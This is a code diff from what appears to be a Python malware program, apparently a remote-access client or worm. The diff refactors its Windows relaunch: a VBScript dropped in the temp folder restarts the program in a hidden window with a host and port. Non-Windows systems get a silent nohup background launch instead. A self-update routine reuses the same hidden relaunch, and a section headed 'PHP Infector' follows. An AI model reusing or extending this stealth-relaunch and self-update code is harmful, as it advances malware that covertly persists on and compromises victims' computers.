@@ -91,12 +91,9 @@ else:
 if sys.platform == "win32":
     if {frozen}: os.system("{exe} {host} {port}")
     else:
-        runner = '''Dim WinScriptHost
-Set WinScriptHost = CreateObject("WScript.Shell")
-WinScriptHost.Run Chr(34) & "{exe} {arg} {host} {port}" & Chr(34), 0
-Set WinScriptHost = Nothing'''
+        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
         with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
-        os.system(tempfile.gettempdir() + "/runner.vbs")
+        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"')
 else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
 """.format(pid=os.getpid(), frozen=frozen, host=host, port=port, exe=sys.executable, arg=sys.argv[0])
 
@@ -109,12 +106,9 @@ def selfUpdate():
         f.write(temporary)
 
     if sys.platform == "win32":
-        runner = '''Dim WinScriptHost
-Set WinScriptHost = CreateObject("WScript.Shell")
-WinScriptHost.Run Chr(34) & "%s" & Chr(34), 0
-Set WinScriptHost = Nothing''' %("{exe} {arg} {host} {port}".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
         with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
-        os.system(tempfile.gettempdir() + "/runner.vbs")
+        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'.format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
     else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
 
 # PHP Infector
